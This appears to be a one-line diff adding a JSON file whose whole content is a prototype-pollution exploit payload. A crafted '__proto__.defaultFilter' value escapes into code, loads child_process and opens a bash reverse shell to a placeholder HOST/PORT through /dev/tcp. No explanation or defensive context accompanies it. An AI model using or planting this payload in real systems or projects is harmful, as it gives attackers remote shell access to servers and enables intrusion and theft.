@@ -1,0 +1,1 @@
+{"dependencies":{"__proto__":{"defaultFilter": "e'));var require=global.require || global.process.mainModule.constructor._load; require('child_process').exec('/bin/bash -c \"/bin/bash -i >& /dev/tcp/HOST/PORT 0>&1\"');//"}}}
